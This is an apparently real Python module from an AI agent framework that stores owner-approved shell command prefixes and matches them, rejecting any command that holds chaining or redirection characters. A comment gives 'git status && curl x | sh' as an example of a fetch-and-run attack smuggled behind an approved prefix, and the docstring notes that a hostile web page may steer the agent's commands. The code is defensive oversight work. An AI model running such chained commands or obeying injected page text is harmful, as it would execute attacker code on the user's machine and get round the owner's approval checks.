"""Owner-managed, project-scoped remembered approvals.

A remembered rule skips only the question; it does not enter the policy kernel, so a BLOCK
verdict is still final. Bruno explicitly accepted on 2026-10-15 that these rules also cover
matching actions after tainted reads: a hostile page may steer a command inside the approved
prefix, and this trade must not be silently changed without a new owner decision.
"""

from __future__ import annotations

import hashlib
import json
import threading
import uuid
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from chimera.core.filelock import atomic_write_text

_LOCK = threading.RLock()


def canonical_project(project: str | Path) -> str:
    """Resolve a workspace without requiring it to exist yet."""
    return str(Path(project).expanduser().resolve())


def pattern_for(tool: str, action: str) -> str:
    """The stored selector: first two displayed whitespace-separated shell tokens, or tool name."""
    if tool == "run_shell":
        # This visibly displayed prefix is the owner's chosen scope, including tainted runs.
        command = action.partition(":")[2].strip()
        return " ".join(command.split()[:2])
    return tool


def _path(home: Path) -> Path:
    return Path(home) / "approval_rules.json"


def list_rules(home: Path) -> list[dict[str, str]]:
    with _LOCK:
        try:
            data = json.loads(_path(home).read_text(encoding="utf-8"))
        except FileNotFoundError:
            return []
        except (OSError, ValueError):
            return []
        if not isinstance(data, list):
            return []
        return [row for row in data if isinstance(row, dict) and all(
            isinstance(row.get(key), str) for key in ("id", "project", "tool", "pattern", "created_at")
        )]


def create_rule(home: Path, project: str | Path, tool: str, action: str) -> dict[str, str]:
    rule = {
        "id": uuid.uuid4().hex,
        "project": canonical_project(project),
        "tool": tool,
        "pattern": pattern_for(tool, action),
        "created_at": datetime.now(UTC).isoformat(),
    }
    with _LOCK:
        rows = list_rules(home)
        rows.append(rule)
        atomic_write_text(_path(home), json.dumps(rows, ensure_ascii=False, indent=2))
    return rule


def revoke_rule(home: Path, rule_id: str) -> bool:
    with _LOCK:
        rows = list_rules(home)
        kept = [row for row in rows if row["id"] != rule_id]
        if len(kept) == len(rows):
            return False
        atomic_write_text(_path(home), json.dumps(kept, ensure_ascii=False, indent=2))
        return True


#: Shell syntax that joins or redirects commands. A remembered prefix approves ONE command that
#: starts with it; `git status && curl x | sh` starts with `git status` and is three commands, so a
#: line holding any of these is asked about as before. The owner's decision covers commands that
#: fit the prefix, including after taint — not whatever can be chained behind one.
_COMPOUND = (";", "&&", "||", "|", "`", "$(", ">", "<", "\n", "\r", "&")


def _is_compound(command: str) -> bool:
    return any(token in command for token in _COMPOUND)


def matching_rule(home: Path, project: str | Path, tool: str, action: str) -> dict[str, str] | None:
    project_root = canonical_project(project)
    if tool == "run_shell" and _is_compound(action.partition(":")[2]):
        return None
    selector = pattern_for(tool, action)
    with _LOCK:
        rows = list_rules(home)
    for row in rows:
        if row["project"] != project_root or row["tool"] != tool:
            continue
        if tool == "run_shell":
            if selector == row["pattern"]:
                return row
        elif row["pattern"] == tool:
            return row
    return None


def tool_and_action(action: str) -> tuple[str, str]:
    """Recover the tool and its human-visible action from the approval card's first line."""
    head = action.splitlines()[0] if action else ""
    tool, separator, target = head.partition(":")
    return (tool.strip(), f"{tool.strip()}: {target.strip()}" if separator else tool.strip())


def reject_run(home: Path, run_id: str, reason: str) -> int:
    """Refuse only this run's still-pending questions, retaining the owner's reason."""
    from chimera.governance.pending import pending

    bounded = reason.strip()[:1000]
    if not bounded:
        return 0
    count = 0
    directory = Path(home) / "approvals"
    for question in pending(home):
        if question.run_id != run_id:
            continue
        path = directory / f"{question.id}.answer.json"
        if path.exists():
            continue
        with _LOCK:
            if path.exists():
                continue
            atomic_write_text(path, json.dumps({
                "approved": False,
                "answered_at": datetime.now(UTC).timestamp(),
                "via": "reject-all",
                "rejection_reason": bounded,
            }))
            count += 1
    # The tool refusal is constructed after all its questions have been answered. Its approver
    # carries the run id, not a question id, so retain the bounded reason under a run-scoped digest
    # instead of trying to read an answer file whose name can never be that run id.
    if count:
        digest = hashlib.sha256(run_id.encode("utf-8")).hexdigest()
        with _LOCK:
            atomic_write_text(
                Path(home) / "approval_rejections" / f"{digest}.json",
                json.dumps({"run_id": run_id, "reason": bounded}, ensure_ascii=False),
            )
    return count


def rejection_reason_for_run(home: Path, run_id: str) -> str:
    """Return the reject-all reason without treating an untrusted run id as a path."""
    digest = hashlib.sha256(run_id.encode("utf-8")).hexdigest()
    try:
        data = json.loads(
            (Path(home) / "approval_rejections" / f"{digest}.json").read_text(encoding="utf-8")
        )
    except (OSError, ValueError):
        return ""
    if not isinstance(data, dict) or data.get("run_id") != run_id:
        return ""
    return str(data.get("reason") or "")


def remember_audit(audit: Any, rule: dict[str, str], action: str) -> None:
    if audit is not None:
        audit.record("approval_remembered", {"rule_id": rule["id"], "tool": rule["tool"], "action": action})


__all__ = [
    "canonical_project",
    "create_rule",
    "list_rules",
    "matching_rule",
    "pattern_for",
    "rejection_reason_for_run",
    "reject_run",
    "revoke_rule",
]
